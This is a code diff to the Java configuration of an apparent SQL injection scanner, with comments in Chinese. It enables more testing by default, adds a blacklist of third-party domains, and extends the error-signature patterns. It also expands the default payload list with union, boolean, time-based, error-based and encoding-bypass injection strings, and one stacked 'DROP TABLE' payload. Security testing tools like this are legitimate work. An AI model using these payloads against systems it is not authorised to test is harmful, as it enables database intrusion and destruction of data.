@@ -46,13 +46,13 @@ public class ScannerConfig {
      * 是否测试 Cookie 参数
      * 启用后会对 Cookie 中的参数进行 SQL 注入测试
      */
-    private volatile boolean testCookieParams = false;
+    private volatile boolean testCookieParams = true;
 
     /**
      * 是否测试数字型参数
      * 启用后对值为纯数字的参数额外测试 -1 和 -0
      */
-    private volatile boolean testNumericParams = false;
+    private volatile boolean testNumericParams = true;
 
     // ==================== 域名过滤配置 ====================
 
@@ -71,12 +71,13 @@ public class ScannerConfig {
      * 黑名单是否启用
      * 启用后不扫描黑名单中的域名
      */
-    private volatile boolean blacklistEnabled = false;
+    private volatile boolean blacklistEnabled = true;
 
     /**
      * 黑名单域名列表（逗号分隔）
+     * 默认包含常见的第三方服务域名
      */
-    private volatile String blacklistUrls = "";
+    private volatile String blacklistUrls = DEFAULT_BLACKLIST_DOMAINS;
 
     // ==================== 请求配置 ====================
 
@@ -132,6 +133,27 @@ public class ScannerConfig {
      * 包含常见的 SQL 注入测试语句
      */
     private static final String DEFAULT_PAYLOADS = """
+            '
+            "
+            `
+            ')
+            ")
+            `)
+            '))
+            "))
+            `))
+            '%20AND%20'1'='1
+            '%20AND%20'1'='2
+            "%20AND%20"1"="1
+            "%20AND%20"1"="2
+            '%20OR%20'1'='1
+            '%20OR%20'1'='2
+            '%20UNION%20SELECT%20NULL--+
+            '%20UNION%20SELECT%20NULL,NULL--+
+            '%20UNION%20SELECT%20NULL,NULL,NULL--+
+            '%20ORDER%20BY%201--+
+            '%20ORDER%20BY%202--+
+            '%20ORDER%20BY%203--+
             'AND%20SLEEP(5)--+
             '%3bSELECT+SLEEP(5)--+
             'and%2bextractvalue(1,concat(0x7e,(select%2b%40%40version),0x7e))--+
@@ -140,7 +162,15 @@ public class ScannerConfig {
             '%20AND%201=(SELECT%201%20FROM%20pg_sleep(5))%20--+
             'and+7778%3dcast((select+version())%3a%3atext+as+numeric)--+
             '%20AND%201=DBMS_LOCK.SLEEP(5)%20--+
-            'and%2b1%3dutl_inaddr.get_host_name((select%2bbanner%2bfrom%2bv$version))--+""";
+            'and%2b1%3dutl_inaddr.get_host_name((select%2bbanner%2bfrom%2bv$version))--+
+            '%3b%20DROP%20TABLE%20test--+
+            '%20||%20'1'=='1
+            '%20&&%20'1'=='1
+            %2527
+            %2522
+            %252d%252d
+            %df'%20OR%201=1--+
+            %bf%27%20OR%201=1--+""";
 
     /**
      * 默认的报错关键词列表
@@ -148,13 +178,39 @@ public class ScannerConfig {
      */
     private static final String DEFAULT_ERROR_PATTERNS = """
             ORA-\\d{5}
+            ORA-00933
+            ORA-01756
+            ORA-00920
+            ORA-00942
+            ORA-00904
+            ORA-01789
+            oracle.jdbc.driver
+            Oracle error
+            oci_error
+            Warning:.*oci_
             SQL syntax.*?MySQL
+            You have an error in your SQL syntax
+            check the manual that corresponds to your MySQL
             Unknown column
+            Duplicate entry
+            Data truncated for column
+            Unknown database
+            Table.*doesn't exist
+            Column.*cannot be null
+            Incorrect.*value
             SQL syntax
             java.sql.SQLSyntaxErrorException
             Error SQL:
             Syntax error
             附近有语法错误
+            语法错误
+            数据库错误
+            查询错误
+            未闭合的引号
+            列名.*无效
+            表或视图不存在
+            关键字.*附近
+            转换失败
             java.sql.SQLException
             引号不完整
             System.Exception: SQL Execution Error!
@@ -165,29 +221,103 @@ public class ScannerConfig {
             MySqlClient
             MySqlException
             mysql_fetch_array()
+            mysql_fetch
+            mysql_query
             mysql_num_rows()
+            mysqli::query
+            mysqli_query
+            mysqli_error
             Warning: mysql_
+            Warning:.*mysql_.*
+            Warning:.*SQL
             Fatal error
+            Fatal error:.*SQL
             on line \\d+
             valid PostgreSQL result
             PG::SyntaxError:
+            ERROR:.*syntax error at or near
+            pg_query.*failed
+            PostgreSQL.*ERROR
+            ERROR:.*relation.*does not exist
+            ERROR:.*column.*does not exist
+            unterminated quoted string
             org.postgresql.jdbc
             PSQLException
             pg_query()
+            pg_exec
+            pg_send_query
+            pg_last_error
+            Warning:.*pg_
             Microsoft SQL Native Client error
             ODBC SQL Server Driver
             SQLServer JDBC Driver
+            Unclosed quotation mark
+            Incorrect syntax near
+            The server supports a maximum of
+            SqlException
+            System.Data.SqlClient.SqlException
+            OleDbException
+            Sqlcmd:
+            Msg \\d+, Level \\d+, State \\d+
             com.jnetdirect.jsql
             macromedia.jdbc.sqlserver
             com.microsoft.sqlserver.jdbc
+            mssql_query
+            Warning:.*mssql_
             Microsoft Access
             Access Database Engine
             ODBC Microsoft Access
-            Oracle error
             DB2 SQL error
+            DB2 SQL error.*SQLCODE
             SQLite error
+            SQLITE_ERROR
+            sqlite3_prepare
+            near.*syntax error
+            unrecognized token
+            no such table
+            no such column
             Sybase message
-            SybSQLException""";
+            SybSQLException
+            Sybase.*Server message
+            com.sybase
+            MongoException
+            MongoDB.*error
+            com.mongodb
+            Invalid BSON field name
+            SQLException
+            PDOException
+            org.springframework.jdbc
+            JDBC.*Exception
+            database error
+            SQL Server.*Driver.*SQL.*error
+            Invalid column name
+            Conversion failed
+            odbc_exec""";
+
+    /**
+     * 默认黑名单域名列表
+     * 包含常见的第三方服务和社交媒体平台
+     */
+    private static final String DEFAULT_BLACKLIST_DOMAINS =
+            "google-analytics.com,googletagmanager.com,analytics.google.com," +
+            "doubleclick.net,googlesyndication.com,googleadservices.com," +
+            "twitter.com,t.co,twimg.com," +
+            "facebook.com,fb.com,fbcdn.net," +
+            "youtube.com,ytimg.com,googlevideo.com," +
+            "instagram.com,cdninstagram.com," +
+            "linkedin.com,licdn.com," +
+            "tiktok.com,tiktokcdn.com," +
+            "pinterest.com,pinimg.com," +
+            "reddit.com,redd.it,redditstatic.com," +
+            "translate.google.com,translate.googleapis.com," +
+            "bing.com/translator,microsofttranslator.com," +
+            "yandex.com/translate,deepl.com," +
+            "cloudflare.com,cloudflareinsights.com," +
+            "jsdelivr.net,cdnjs.cloudflare.com,unpkg.com," +
+            "github.com,githubusercontent.com,github.io," +
+            "gravatar.com,wp.com,wordpress.com," +
+            "disqus.com,disquscdn.com," +
+            "snap.com,snapchat.com";
 
     /**
      * 需要跳过扫描的静态文件扩展名
